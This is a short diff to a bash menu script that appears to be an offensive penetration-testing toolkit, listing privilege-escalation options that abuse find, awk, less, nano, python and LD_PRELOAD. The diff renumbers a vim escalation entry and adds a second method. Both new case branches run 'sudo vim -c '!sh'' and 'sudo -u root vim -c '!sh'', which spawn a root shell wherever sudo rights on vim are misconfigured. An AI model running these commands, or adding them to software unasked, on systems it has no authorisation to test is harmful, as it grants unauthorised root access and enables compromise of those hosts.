@@ -165,7 +165,8 @@ while true; do
 	echo -ne " 197. PrivEsc with find and awk\t\t\t\t198. PrivEsc with less\t\t\t\t199. PrivEsc with more\n"
 	echo -ne " 200. list all bins with perm 400 root\t\t\t201. PrivEsc with nano\t\t\t\t202. PrivEsc with apache2\n"
 	echo -ne " 203. PrivEsc with LP_PRELOAD\t\t\t\t204. get capabilities\t\t\t\t205. PrivEsc with python\n"
-	echo -ne " 210. Decode, unzip and decrypt a file from linuxallremote\t\t\t\t111. PrivEsc with vim\n"
+	echo -ne " 210. Decode, unzip and decrypt a file from linuxallremote\t\t\t\t107. PrivEsc with vim method 1\n"
+	echo -ne " 108. PrivEsc with vim method 2\n"
 	echo "WINRM"
 	echo -ne " 132. Alamot/code-snippets/winrm/\n"
 	echo "OTHERS"
@@ -557,8 +558,11 @@ while true; do
                         echo "gcc does not exist"
                 fi
 	;;
-	"111")
-		sudo vim -c "!sh"
+	"107")
+		sudo vim -c '!sh'
+	;;
+	"108")
+		sudo -u root vim -c '!sh'
 	;;
 	"110")
 		read -p "Paste escaped hex values" HEXD
